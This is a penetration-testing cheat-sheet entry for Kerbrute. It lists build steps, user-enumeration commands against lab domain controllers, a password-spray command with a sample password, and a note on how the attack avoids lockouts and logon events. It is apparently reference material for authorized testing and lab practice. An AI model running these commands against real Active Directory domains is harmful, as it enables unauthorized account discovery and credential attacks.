---
title: Kerbrute - User Enumeration via Kerberos
category: ad
subcategory: ad-enum
os: linux
command: kerbrute userenum -d domain --dc target wordlist
tools: kerbrute
---


### Build / install

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute && make linux
sudo cp dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute
```

### User enumeration

```bash
kerbrute userenum /usr/share/seclists/Usernames/Names/names.txt --dc 10.10.86.201 -d THM-AD
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
./kerbrute_linux_amd64 userenum --dc 192.168.116.158 -d zeus.corp -o kerbrute-user-enum xato-net-10-million-usernames.txt
```

### Password spray

```bash
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

### How it works

It sends TGT requests with no pre-authentication. If pre-auth is required, the username is valid - and no failed-logon event is generated, so it does not lock accounts.
